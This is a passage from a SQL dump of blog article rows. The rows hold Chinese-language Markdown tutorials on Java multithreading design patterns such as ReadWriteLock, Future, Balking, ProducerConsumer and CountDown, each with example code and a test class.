RunnableEvent event) {\n        listener.onEvent(event);\n    }\n\n    public enum RunnableState {\n        RUNNING,ERROR,DONE;\n    }\n\n    public static class RunnableEvent {\n        private final RunnableState state;\n        private final Thread thread;\n        private final Throwable cause;\n        public RunnableEvent(RunnableState state, Thread thread, Throwable cause) {\n            this.state = state;\n            this.thread = thread;\n            this.cause = cause;\n        }\n        public RunnableState getState() {\n            return state;\n        }\n        public Thread getThread() {\n            return thread;\n        }\n        public Throwable getCause() {\n            return cause;\n        }\n    }\n\n    @Override\n    public void run() {\n        try {\n            notifyChange(new RunnableEvent(RunnableState.RUNNING, Thread.currentThread(), null));\n            System.out.println(\"query for the id\" + queryId);\n            Thread.sleep(1_000);\n            notifyChange(new RunnableEvent(RunnableState.DONE, Thread.currentThread(), null));\n        } catch (Exception e) {\n            notifyChange(new RunnableEvent(RunnableState.DONE, Thread.currentThread(), e));\n        }\n    }\n}\n```\n#### 观察者监听实现ThreadLifeCycleObserver\n```java\npublic class ThreadLifeCycleObserver implements LifeCycleListener {\n    private final Object LOCK = new Object();\n\n    public void concurrentQuery(List<String> ids) {\n        if (ids == null || ids.isEmpty()) {\n            return;\n        }\n        ids.stream().forEach(id -> new Thread(new ObserverRunnable(this, id)).start());\n    }\n\n    @Override\n    public void onEvent(ObserverRunnable.RunnableEvent event) {\n        synchronized (LOCK) {\n            System.out.println(\"The runnable [\" + event.getThread().getName() + \"] data change and state is [\" + event.getState() +\"]\");\n            if (event.getCause() != null) {\n                System.out.println(\"The runnable [\" + event.getThread().getName() + \"] process failed.\");\n                event.getCause();\n            }\n        }\n    }\n}\n```\n#### 测试ThreadLifeCycleClient\n```java\npublic class ThreadLifeCycleClient {\n    public static void main(String[] args) {\n        new ThreadLifeCycleObserver().concurrentQuery(Arrays.asList(\"1\", \"2\"));\n    }\n}\n```', 0, 0, 32, 0, 0, '2020-06-17 22:58:25', '2020-06-17 22:58:25', 0, 0);
INSERT INTO `article` VALUES (82, 1, 'ReadWriteLock-多线程设计模式', '2019/10/1570339051_mmexport1570282436527.jpg', '### 读写锁设计模式\n```java\n// 读写锁设计模式ReadWriteLock\n(1) 这是一种多线程情况下非常高效的设计模式\n(2) 传统锁由于读与读之间不需要同步但也进行同步的原因导致性能差\n(3) 读写锁的设计是读与写的锁分开实现,分为读锁与写锁,读锁与读锁共同使用并不会产生同步\n\n读与读不冲突\n读与写冲突\n写与写冲突\n\n```\n### 代码示例\n#### 读写锁ReadWriteLock\n```java\npublic class ReadWriteLock {\n    private int readingReaders = 0;\n    private int waitingReaders = 0;\n    private int writingWriters = 0;\n    private int waitingWriters = 0;\n    private boolean preferWriter = true;\n    public ReadWriteLock() {\n        this(true);\n    }\n    public ReadWriteLock(boolean preferWriter) {\n        this.preferWriter = preferWriter;\n    }\n\n    public synchronized void readLock() throws InterruptedException {\n        this.waitingReaders++;\n        try {\n            while (writingWriters > 0 || (preferWriter && waitingWriters > 0)) {\n                // 存在写入操作,不能读\n                this.wait();\n            }\n            this.readingReaders++;\n        } finally {\n            this.waitingReaders--;\n        }\n    }\n\n    public synchronized void readUnlock() {\n        this.readingReaders--;\n        this.notifyAll();\n    }\n\n    public synchronized void writeLock() throws InterruptedException {\n        this.waitingWriters++;\n        try {\n            while (readingReaders > 0 || writingWriters > 0) {\n                this.wait();\n            }\n            this.writingWriters++;\n        } finally {\n            this.waitingWriters--;\n        }\n    }\n\n    public synchronized void writeUnlock() {\n        this.writingWriters--;\n        this.notifyAll();\n    }\n}\n```\n#### 共享数据\n```java\npublic class ShardData {\n    private final char[] buffer;\n\n    private final ReadWriteLock lock = new ReadWriteLock();\n\n    public ShardData(int size) {\n        this.buffer = new char[size];\n        for (int i = 0; i < buffer.length; i++) {\n            this.buffer[i] = \'*\';\n        }\n    }\n\n    public char[] read() throws InterruptedException {\n        try {\n            lock.readLock();\n            return this.doRead();\n        } finally {\n            lock.readUnlock();\n        }\n    }\n\n    public void write(char c) throws InterruptedException {\n        try {\n            lock.writeLock();\n            this.doWrite(c);\n        } finally {\n            lock.writeUnlock();\n        }\n    }\n\n    private void doWrite(char c) {\n        for (int i = 0; i < buffer.length; i++) {\n            buffer[i] = c;\n            slowly(10);\n        }\n    }\n\n    private char[] doRead() {\n        char[] newBuf = new char[buffer.length];\n        for (int i = 0; i < buffer.length; i++) {\n            newBuf[i] = buffer[i];\n        }\n        slowly(50);\n        return newBuf;\n    }\n\n    private void slowly(int ms) {\n        try {\n            Thread.sleep(ms);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n#### 读执行器\n```java\npublic class ReaderWorker extends Thread {\n\n    private final ShardData data;\n\n    public ReaderWorker(ShardData data) {\n        this.data = data;\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (true) {\n                char[] readBuf = data.read();\n                System.out.println(Thread.currentThread().getName() + \" reads \" + String.valueOf(readBuf));\n            }\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n#### 写执行器\n```java\npublic class WriterWorker extends Thread {\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    private final ShardData data;\n\n    private final String filler;\n\n    private int index = 0;\n\n    public WriterWorker(ShardData data, String filler) {\n        this.data = data;\n        this.filler = filler;\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (true) {\n                char c = this.nextChar();\n                data.write(c);\n                Thread.sleep(random.nextInt(1_000));\n            }\n        } catch (InterruptedException e){\n            e.printStackTrace();\n        }\n    }\n\n    private char nextChar() {\n        char c = filler.charAt(index);\n        index++;\n        if (index >= filler.length()) {\n            index = 0;\n        }\n        return c;\n    }\n}\n```\n#### 测试\n```java\npublic class ReadWriteLockClient {\n    public static void main(String[] args) {\n        final ShardData shardData = new ShardData(10);\n        new ReaderWorker(shardData).start();\n        new ReaderWorker(shardData).start();\n        new ReaderWorker(shardData).start();\n        new ReaderWorker(shardData).start();\n        new ReaderWorker(shardData).start();\n\n        new WriterWorker(shardData, \"qwe\").start();\n        new WriterWorker(shardData, \"QWE\").start();\n    }\n}\n```', 0, 0, 29, 0, 0, '2020-06-17 13:17:38', '2020-06-17 13:17:38', 0, 0);
INSERT INTO `article` VALUES (83, 1, 'Immutable-多线程设计模式', '2019/10/1570342630_mmexport1570282351152.jpg', '### 不可变设计模式\n```java\n// 不可变设计模式Immutable\n(1) 变量赋值一次后只能读取，不能改变\n(2) 不可变对象内的属性也是不可变的,不可变对象内的list等属性的增删改是不被允许的\n(3) 不可变对象一定是线程安全的,里面的任何属性或者引用类型的属性都不能被修改\n\n```\n### 代码示例\n#### 创建一个不可变对象\n```java\nfinal public class ImmutableTest {\n    private final int age;\n    private final String name;\n    private final List<String> list; // list内容会被修改\n\n    public ImmutableTest(int age, String name) {\n        this.age = age;\n        this.name = name;\n        this.list = new ArrayList<String>();\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public List<String> getList() {\n        return Collections.unmodifiableList(list); // list不可add..remove..\n    }\n}\n```\n#### String对象的不可变\n```java\npublic class StringTest {\n    public static void main(String[] args) {\n        String s = \"Hello\";\n        String s2 = s.replace(\"l\", \"k\");\n		// hacshCode不同,String对象是不可变的\n		// 使用replace并不是实际替换,而是新创建了一个String\n        System.out.println(s2.getClass() + \" \" + s2.hashCode());\n        System.out.println(s.getClass() + \" \" + s.hashCode());\n    }\n}\n```\n#### 不可变对象一定是线程安全的\n```java\nfinal public class Person {\n    private final String name;\n    private final String address;\n\n    public Person(final String name, final String address) {\n        this.name = name;\n        this.address = address;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public String getAddress() {\n        return address;\n    }\n\n    @Override\n    public String toString() {\n        return \"Person{\" +\n                \"name=\'\" + name + \'\\\'\' +\n                \", address=\'\" + address + \'\\\'\' +\n                \'}\';\n    }\n}\n```\n```java\npublic class UserPersonThread extends Thread {\n    private Person person;\n    public UserPersonThread(Person person) {\n        this.person = person;\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            System.out.println(Thread.currentThread().getName() + \" print \" + person.toString());\n        }\n    }\n}\n```\n```java\npublic class ImmutableClient {\n    public static void main(String[] args) {\n        // share data\n        Person person = new Person(\"Alex\", \"GuanSu\");\n        IntStream.range(0, 5).forEach(i -> {\n            new UserPersonThread(person).start();\n        });\n    }\n}\n\n不可变对象一定是线程安全的,因为对象以及对象的属性都不会改变\n```\n#### 不可变对象的性能\n```java\npublic class ImmutablePerformance {\n    public static void main(String[] args) throws InterruptedException {\n        long startTimestamp = System.currentTimeMillis();\n        // SyncObj syncObj = new SyncObj();\n        // syncObj.setName(\"Alex\");\n        ImmutableObj immutableObj = new ImmutableObj(\"Alex\");\n        Thread t1 = new Thread() {\n            @Override\n            public void run() {\n                for (long i = 0L; i < 1_000_000; i++) {\n                    System.out.println(Thread.currentThread().getName() + \": \" + immutableObj.toString());\n                }\n            }\n        };\n        t1.start();\n\n        Thread t2 = new Thread() {\n            @Override\n            public void run() {\n                for (long i = 0L; i < 1_000_000; i++) {\n                    System.out.println(Thread.currentThread().getName() + \": \" + immutableObj.toString());\n                }\n            }\n        };\n        t2.start();\n        t1.join();\n        t2.join();\n\n        long endTimestamp = System.currentTimeMillis();\n        System.out.println(\"Elapsed time \" + (endTimestamp - startTimestamp));\n    }\n}\n// 不可变对象\nfinal class ImmutableObj {\n    private final String name;\n    ImmutableObj(String name) {\n        this.name = name;\n    }\n\n    @Override\n    public String toString() {\n        return \"ImmutableObj{\" +\n                \"name=\'\" + name + \'\\\'\' +\n                \'}\';\n    }\n}\n// 可变对象\nclass SyncObj {\n    private String name;\n    public synchronized void setName(String name) {\n        this.name = name;\n    }\n\n    @Override\n    public String toString() {\n        return \"SyncObj{\" +\n                \"name=\'\" + name + \'\\\'\' +\n                \'}\';\n    }\n}\n\n多线程下,不可变对象的性能要比可变对象更好一些\n```', 0, 0, 26, 0, 0, '2020-06-19 14:17:18', '2020-06-19 14:17:18', 0, 0);
INSERT INTO `article` VALUES (84, 1, 'Future-多线程设计模式', '2019/10/1570343628_mmexport1570283555752.jpg', '### 未来设计模式\n```java\n// 未来设计模式Future\n1. 调用某个方法时，这个方法可能需要请求其它系统，这个过程比较耗时，为了提高客户的体验需要方法立即返回，过一段时间再查询结果\n2. 它是非常常见的设计模式,它可以有效提高程序性能体验\n\n```\n### 代码示例\n```java\n1. Future           -> 代表的是未来的一个凭据\n2. FutureTask       -> 将你的调用逻辑进行了隔离\n3. FutureService    -> 桥接 Future和FutureTask\n\n```\n#### 定义接口Future\n```java\npublic interface Future<T> {\n    T get() throws InterruptedException;\n}\n```\n#### 异步Future实现\n```java\npublic class AsyncFuture<T> implements Future<T> {\n\n    private volatile boolean done = false;\n\n    private T result;\n\n    public void done(T result) {\n        synchronized (this) {\n            this.result = result;\n            this.done = true;\n            this.notifyAll();\n        }\n    }\n\n    @Override\n    public T get() throws InterruptedException {\n        synchronized (this) {\n            while (!done) {\n                this.wait();\n            }\n        }\n        return result;\n    }\n}\n```\n#### 任务接口\n```java\npublic interface FutureTask<T> {\n    T call();\n}\n```\n#### 桥接Future和FutureTask\n```java\npublic class FutureService {\n    public <T> Future<T> submit(final FutureTask<T> task) {\n        AsyncFuture<T>  asyncFuture = new AsyncFuture<>();\n        new Thread(()->{\n            T result = task.call();\n            asyncFuture.done(result);\n        }).start();\n        return asyncFuture;\n    }\n\n	// 改造一下,接收一个回调函数 \n    public <T> Future<T> submit(final FutureTask<T> task, final Consumer<T> consumer) {\n        AsyncFuture<T> asyncFuture = new AsyncFuture<>();\n        new Thread(()->{\n            T result = task.call();\n            asyncFuture.done(result);\n            consumer.accept(result);\n        }).start();\n        return asyncFuture;\n    }\n}\n```\n#### 测试\n```java\npublic class SyncInvoker {\n    public static void main(String[] args) throws InterruptedException {\n        /*String result = get();\n        System.out.println(result);*/\n        FutureService futureService = new FutureService();\n        Future<String> future = futureService.submit(() -> {\n            try {\n                Thread.sleep(10_000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            return \"FINISH\";\n        }, System.out::println);\n\n        System.out.println(\"================\");\n        System.out.println(\"do other things\");\n        System.out.println(\"================\");\n        System.out.println(future.get());\n    }\n    private static String get() throws InterruptedException {\n        Thread.sleep(10_000L);\n        return \"FINISH\";\n    }\n}\n```', 0, 0, 30, 0, 0, '2020-06-22 14:33:54', '2020-06-22 14:33:54', 0, 0);
INSERT INTO `article` VALUES (85, 1, 'GuardedSuspension-多线程设计模式', '2019/10/1570346850_mmexport1570282461626.jpg', '### 挂起设计模式\n```java\n// 挂起设计模式GuardedSuspension\n判断某个条件是否为真，如果条件成立则继续执行一步。\n如果条件不成立用wait()方法挂起当前线程。\n当条件为真后由另一个线程用notify()或 着notifyAll()方法唤醒挂起的线程\n\n```\n### 代码示例\n```java\nGuardedSuspension模式非常适合在队列中使用\ngetRequest(): 当队列不存在request时用wait挂起当前线程\nputRequest(Request): 将request加入到队列中,并唤醒挂起的线程\n\n```\n#### 单个请求Request\n```java\npublic class Request {\n    private final String value;\n\n    Request(String value) {\n        this.value = value;\n    }\n\n    public String getValue() {\n        return value;\n    }\n}\n```\n#### 存放请求的队列RequestQueue,实现GuardedSuspension\n```java\npublic class RequestQueue {\n\n    private final LinkedList<Request> queue = new LinkedList<>();\n\n    public Request getRequest() {\n        synchronized (queue) {\n            while (queue.size() <= 0) {\n                try {\n                    queue.wait();\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                    return null;\n                }\n            }\n            return queue.removeFirst();\n        }\n    }\n\n    public void putRequest(Request request) {\n        synchronized (queue) {\n            queue.addLast(request);\n            queue.notifyAll();\n        }\n    }\n}\n```\n#### put队列请求的线程ClientThread\n```java\npublic class ClientThread extends Thread {\n\n    private final RequestQueue queue;\n\n    private final Random random;\n\n    private final String sendValue;\n\n    public ClientThread(RequestQueue queue, String sendValue) {\n        this.queue = queue;\n        this.sendValue = sendValue;\n        this.random = new Random(System.currentTimeMillis());\n    }\n\n    @Override\n    public void run() {\n        for (int i = 0; i < 10; i++) {\n            System.out.println(\"Client -> request \" + sendValue);\n            queue.putRequest(new Request(sendValue));\n            try {\n                Thread.sleep(random.nextInt(1_000));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n#### get队列请求的ServerThread\n```java\npublic class ServerThread extends Thread {\n\n    private final RequestQueue queue;\n\n    private final Random random;\n\n    private volatile boolean closed = false;\n\n    public ServerThread(RequestQueue queue) {\n        this.queue = queue;\n        this.random = new Random(System.currentTimeMillis());\n    }\n\n    @Override\n    public void run() {\n        while (!closed) {\n            Request request = queue.getRequest();\n            if (null == request) {\n                System.out.println(\"Received the empty request.\");\n                continue;\n            }\n            System.out.println(\"Server ->\" + request.getValue());\n            try {\n                Thread.sleep(random.nextInt(1_000));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n                return;\n            }\n        }\n    }\n\n    public void close() {\n        this.closed = true;\n        this.interrupt();\n    }\n\n}\n```\n#### 测试\n```java\npublic class SuspensionClient {\n    public static void main(String[] args) throws InterruptedException {\n        final RequestQueue queue = new RequestQueue();\n        new ClientThread(queue, \"Alex\").start();\n        ServerThread serverThread = new ServerThread(queue);\n        serverThread.start();\n\n        Thread.sleep(10_000);\n        serverThread.close();\n    }\n}\n```', 0, 0, 32, 0, 0, '2020-06-22 15:27:41', '2020-06-22 15:27:41', 0, 0);
INSERT INTO `article` VALUES (86, 1, 'ThreadSpecificStorage-多线程设计模式', '2019/10/1570350678_mmexport1570282138370.jpg', '### 线程个别存储设计模式\n```java\n// 线程个别存储设计模式ThreadSpecificStorage\n(1) 把对象封装到一个线程里,只有这一个线程看到这个对象,那么这个对象就算不是线程安全的,也不会出现任何线程不安全的问题,因为它只能在一个线程里进行访问\n(2) 运用这种模式可以在调用方法链过程中不需要传递参数,但需要保证这个调用过程始终是在一个线程当中\n(3) 这是非常常见的模式且非常便于使用\n\n// 应用场景\n(1) 运用ThreadSpecificStorage设计模式可以在调用方法链过程中不用传递参数,但请保证调用过程中始终保持在一个线程中\n(2) 在web开发中,一个请求对应一条线程,有时需要request与response这两个对象,这时可以使用ThreadLocal将这两个对象进行存储,在需要的地方取出使用;注意在调用链结束时释放资源\n```\n### 使用hashMap实现ThreadSpecificStorage模式\n```java\n简易的threadSpecificStorage模式实现\n将当前线程作为Map的Key进行存储,这能保证在多线程情况下,当前线程只能获得自己的存储数据\njdk中有一个ThreadLocal实现了ThreadSpecificStorage设计模式,它也是将当前线程作为存储的Key值,从而实现ThreadSpecificStorage设计模式,但相对于此图,它功能更加完善\n\n```\n#### 使用hashMap实现简易的ThreadLocal\n```java\n/**\n * 始终已当前线程作为key值\n * @param <T>\n */\npublic class ThreadLocalSimulator<T> {\n    private final Map<Thread, T> storage = new HashMap<>();\n    public void set(T t) {\n        synchronized (this) {\n            Thread key = Thread.currentThread();\n            storage.put(key, t);\n        }\n    }\n\n    public T get() {\n        synchronized (this) {\n            Thread key = Thread.currentThread();\n            T value = storage.get(key);\n            if (null == value) {\n                return initialValue();\n            }\n            return value;\n        }\n    }\n\n    public T initialValue() {\n        return null;\n    }\n}\n```\n#### 测试\n```java\npublic class ThreadLocalSimulatorTest {\n\n    private final static ThreadLocalSimulator<String> threadLocal = new ThreadLocalSimulator<String>() {\n        @Override\n        public String initialValue() {\n            return \"No value\";\n        }\n    };\n\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread t1 = new Thread(() -> {\n            threadLocal.set(\"Thread-T1\");\n            try {\n                Thread.sleep(random.nextInt(1_000));\n                System.out.println(Thread.currentThread().getName() + \" \" + threadLocal.get());\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n        Thread t2 = new Thread(() -> {\n            threadLocal.set(\"Thread-T2\");\n            try {\n                Thread.sleep(random.nextInt(1_000));\n                System.out.println(Thread.currentThread().getName() + \" \" + threadLocal.get());\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n        System.out.println(\"=========================\");\n        System.out.println(Thread.currentThread().getName() + \" \" + threadLocal.get());\n    }\n}\n```\n### ThreadSpecificStorage模式用于调用方法链\n#### 传递过程中所涉及的数据Context\n```java\npublic class Context {\n\n    private String name;\n    private String cardId;\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setCardId(String cardId) {\n        this.cardId = cardId;\n    }\n\n    public String getCardId() {\n        return cardId;\n    }\n}\n```\n#### 运用ThreadLocal保存数据信息在调用的线程中\n```java\nfinal public class ActionContext {\n\n    private static final ThreadLocal<Context> threadLocal = new ThreadLocal<Context>() {\n        @Override\n        protected Context initialValue() {\n            return new Context();\n        }\n    };\n\n    private static class ContextHolder {\n        private final static ActionContext actionContext = new ActionContext();\n    }\n\n    public static ActionContext getActionContext() {\n        return ContextHolder.actionContext;\n    }\n\n    public Context getContext() {\n        return threadLocal.get();\n    }\n}\n```\n#### 调用的第一个方法\n```java\npublic class QueryFromDBAction {\n\n    public void execute() {\n        try {\n            Thread.sleep(1_000);\n            String name = \"Alex \" + Thread.currentThread().getName();\n            ActionContext.getActionContext().getContext().setName(name);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n#### 调用的第二个方法\n```java\npublic class QueryFromHttpAction {\n\n    public void execute() {\n        String cardId = this.getCardId(ActionContext.getActionContext().getContext().getName());\n        ActionContext.getActionContext().getContext().setCardId(cardId);\n    }\n\n    private String getCardId(String name) {\n        try {\n            Thread.sleep(1_000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        return \"235623346334 \"+ Thread.currentThread().getName();\n    }\n}\n```\n#### 执行调用链\n```java\npublic class ExecutionTask implements Runnable {\n\n    private QueryFromDBAction dbAction = new QueryFromDBAction();\n\n    private QueryFromHttpAction httpAction = new QueryFromHttpAction();\n\n    @Override\n    public void run() {\n        Context context = ActionContext.getActionContext().getContext();\n        dbAction.execute();\n        System.out.println(\"The name query successful\");\n        httpAction.execute();\n        System.out.println(\"The Card id query successful\");\n        System.out.println(\"The Name is \" + context.getName() + \" and CardId \" + context.getCardId());\n    }\n}\n```\n#### 测试\n```java\npublic class ContextTest {\n    public static void main(String[] args) {\n        IntStream.range(1, 5)\n            .forEach(i -> {\n                new Thread(new ExecutionTask()).start();\n            });\n    }\n}\n```', 0, 0, 30, 0, 0, '2020-06-22 16:31:30', '2020-06-22 16:31:30', 0, 0);
INSERT INTO `article` VALUES (87, 1, 'Balking-多线程设计模式', '2019/10/1570353644_mmexport1570282483414.jpg', '### 溜达设计模式\n```java\n// 溜达设计模式Balking\n(1) 判断某个条件是否为真。\n如果条件成立则继续执行一步,条件成立那么正常执行。\n如果条件不成立直接立即返回,不进行挂起等待\n(2) 相对于GuardedSuspension挂起设计模式而言,同样是面对条件不成立。\nGuardedSuspension设计模式选择挂起等待条件成立被唤醒,而Balking模式则直接返回放弃这次操作\n\n```\n### 代码示例\n```java\nCustomerThread不断地实时使条件成立,就像餐厅客人不断招手点单\nWaiterThread不断地检查是否有条件成立,如果成立那么就会去处理,如果没有成立那么就啥也不做,就像餐厅服务员不断观察有没有客人招手\n\n```\n#### 实时数据,当条件成立时进行处理\n```java\npublic class BalkingData {\n    private final String fileName;\n\n    private String content;\n\n    private boolean changed;\n\n    public BalkingData(String fileName, String content) {\n        this.fileName = fileName;\n        this.content = content;\n        this.changed = true;\n    }\n\n    public synchronized void change(String newContent) {\n        this.content = newContent;\n        this.changed = true;\n    }\n\n    public synchronized void save() throws IOException {\n        if (!changed) {\n            return;\n        }\n        doSave();\n        this.changed = false;\n    }\n\n    private void doSave() throws IOException {\n        System.out.println(Thread.currentThread().getName() + \" calls do save,content=\" + content);\n        try(Writer writer = new FileWriter(fileName, true)) {\n            writer.write(content);\n            writer.write(\"\\n\");\n            writer.flush();\n        }\n    }\n\n}\n```\n#### 实时使条件成立,并叫处理\n```java\npublic class CustomerThread extends Thread {\n\n    private final BalkingData balkingData;\n\n    private final Random random = new Random(System.currentTimeMillis());\n\n    public CustomerThread(BalkingData balkingData) {\n        super(\"Customer\");\n        this.balkingData = balkingData;\n    }\n\n    @Override\n    public void run() {\n       try {\n           balkingData.save();\n           for (int i = 0; i < 20; i++) {\n               balkingData.change(\"No.\" + i);\n               Thread.sleep(random.nextInt(1_000));\n               balkingData.save();\n           }\n       } catch (IOException e) {\n           e.printStackTrace();\n       } catch (InterruptedException e) {\n           e.printStackTrace();\n       }\n    }\n}\n```\n#### 实时检查条件成立,成立就进行处理\n```java\npublic class WaiterThread extends Thread {\n\n    private final BalkingData balkingData;\n\n    public WaiterThread(BalkingData balkingData) {\n        super(\"Waiter\");\n        this.balkingData = balkingData;\n    }\n\n    @Override\n    public void run() {\n        for (int i = 0; i < 200; i++) {\n            try {\n                balkingData.save();\n                Thread.sleep(1_000);\n            } catch (IOException e) {\n                e.printStackTrace();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n#### 测试\n```java\npublic class BalkingClient {\n    public static void main(String[] args) {\n        BalkingData balkingData = new BalkingData(\"balking.txt\", \"===BEGIN====\");\n        new CustomerThread(balkingData).start();\n        new WaiterThread(balkingData).start();\n    }\n}\n```', 0, 0, 27, 0, 0, '2020-06-22 17:20:50', '2020-06-22 17:20:50', 0, 0);
INSERT INTO `article` VALUES (88, 1, 'ProducerConsumer-多线程设计模式', '2019/10/1570356036_mmexport1570283146051.jpg', '### 生产消费设计模式\n```java\n// 生产消费设计模式ProducerConsumer\n1. 生产线程将东西不断添加到队列中,然后唤醒消费线程,当生产到指定的数量时生产线程挂起\n2. 消费线程将队列中的东西不断消费,消费后唤醒生产线程,当队列中没有东西可消费时消费线程挂起\n3. 这是非常常见的设计模式\n\n```\n### 代码示例\n```java\nProducerThread生产线程不断生产,生产后唤醒消费线程,当生产达到规定数量时挂起\nConsumerThread消费线程不断消费,消费后唤醒生产线程,当队列为空时挂起\n```\n#### 消息\n```java\npublic class Message {\n    private String data;\n\n    public Message(String data) {\n        this.data = data;\n    }\n\n    public String getData() {\n        return data;\n    }\n\n    public void setData(String data) {\n        this.data = data;\n    }\n}\n```\n#### 消息队列\n```java\npublic class MessageQueue {\n    private final LinkedList<Message> queue;\n\n    private final static int DEFAULT_MAX_LIMIT = 100;\n\n    private final int limit;\n\n    public MessageQueue() {\n        this(DEFAULT_MAX_LIMIT);\n    }\n\n    public MessageQueue(final int limit) {\n        this.limit = limit;\n        this.queue = new LinkedList<Message>();\n    }\n\n    public void put(Message message) throws InterruptedException {\n        synchronized (queue) {\n            while (queue.size() > limit) {\n                queue.wait();\n            }\n            queue.addLast(message);\n            queue.notifyAll();\n        }\n    }\n\n    public Message take() throws InterruptedException {\n        synchronized (queue) {\n            while (queue.isEmpty()) {\n                queue.wait();\n            }\n            Message message = queue.removeFirst();\n            queue.notifyAll();\n            return message;\n        }\n    }\n\n    public int getMaxLimit() {\n        return this.limit;\n    }\n\n    public int getMessageSize() {\n        synchronized (queue) {\n            return queue.size();\n        }\n    }\n}\n```\n#### 生产线程\n```java\npublic class ProducerThread extends Thread {\n\n    private final MessageQueue messageQueue;\n\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    private final static AtomicInteger counter = new AtomicInteger(0);\n\n    public ProducerThread(MessageQueue messageQueue, int seq) {\n        super(\"Producer\" + seq);\n        this.messageQueue = messageQueue;\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Message message = new Message(\"Message-\" + counter.getAndIncrement());\n                messageQueue.put(message);\n                System.out.println(Thread.currentThread().getName() + \" put message \" + message.getData());\n                Thread.sleep(random.nextInt(1_000));\n            } catch (InterruptedException e) {\n                break;\n            }\n        }\n    }\n}\n```\n#### 消费线程\n```java\npublic class ConsumerThread extends Thread {\n\n    private final MessageQueue messageQueue;\n\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    public ConsumerThread(MessageQueue messageQueue, int seq) {\n        super(\"Consumer\" + seq);\n        this.messageQueue = messageQueue;\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Message message = messageQueue.take();\n                System.out.println(Thread.currentThread().getName() + \" take a message \" + message.getData());\n                Thread.sleep(random.nextInt(1_000));\n            } catch (InterruptedException e) {\n                break;\n            }\n        }\n    }\n}\n```\n#### 测试\n```java\npublic class ProducerAndConsumerClient {\n    public static void main(String[] args) {\n        final MessageQueue messageQueue = new MessageQueue();\n        new ProducerThread(messageQueue, 1).start();\n        new ConsumerThread(messageQueue, 1).start();\n\n        new ProducerThread(messageQueue, 2).start();\n        new ConsumerThread(messageQueue, 2).start();\n    }\n}\n```', 0, 0, 26, 0, 0, '2020-06-24 18:00:43', '2020-06-24 18:00:43', 0, 0);
INSERT INTO `article` VALUES (89, 1, 'CountDown-多线程设计模式', '2019/10/1570361618_mmexport1570358382764.jpg', '### 倒数设计模式\n```java\n// 倒数设计模式CountDown\n(1) 它的作用是等待所有子线程任务完成后执行最终任务\n(2) 记录一个数字5,表示有5个子任务;当每个子任务完成时,该数字减一,当该数字降为0,那么就执行最终的任务,当然也可以反过来,数字不断增加,增加到某个数值时执行某操作\n(3) jdk对CountDown设计模式做出了实现类CountDownLatch\n(5) 在执行某些操作时,需要先执行某些异步操作,由于异步不知何时完成,此时CountDown是一种非常好的解决方案\n(6) 多线程的join()方法也可以完成这样的功能,但countDown更加利于阅读与使用\n\n```\n### 代码示例\n```java\ndown(): 当一个子线程的任务完成时调用,改变数字,当数字到达某个数值时唤醒waitSet中正在挂起的线程\nawait(): 挂起等待所有子线程任务完成,直到被唤醒\n```\n#### 编写简易CountDown\n```java\npublic class CountDown {\n\n    private final int total;\n\n    private int counter = 0;\n\n    public CountDown(int total) {\n        this.total = total;\n    }\n\n    public void down() {\n        synchronized (this) {\n            this.counter++;\n            this.notifyAll();\n        }\n    }\n\n    public void await() throws InterruptedException {\n        synchronized (this) {\n            while (counter != total) {\n                this.wait();\n            }\n        }\n    }\n}\n```\n#### 测试\n```java\npublic class CustomerCountDownClient {\n\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    public static void main(String[] args) throws InterruptedException {\n        final CountDown latch = new CountDown(5);\n        System.out.println(\"准备多线程处理任务\");\n        // the first phase.\n        IntStream.rangeClosed(1, 5).forEach(i ->\n                new Thread(()->{\n                    System.out.println(Thread.currentThread().getName() + \" is working.\");\n                    try {\n                        Thread.sleep(random.nextInt(1_000));\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                    latch.down();\n                }, String.valueOf(i)).start()\n        );\n        latch.await();\n        // the second phase\n        System.out.println(\"多线程任务全部结束,准备第二阶段任务\");\n        System.out.println(\"...........\");\n        System.out.println(\"FINISH\");\n    }\n}\n```', 0, 0, 19, 0, 0, '2020-06-24 19:33:43', '2020-06-24 19:33:43', 0, 0);
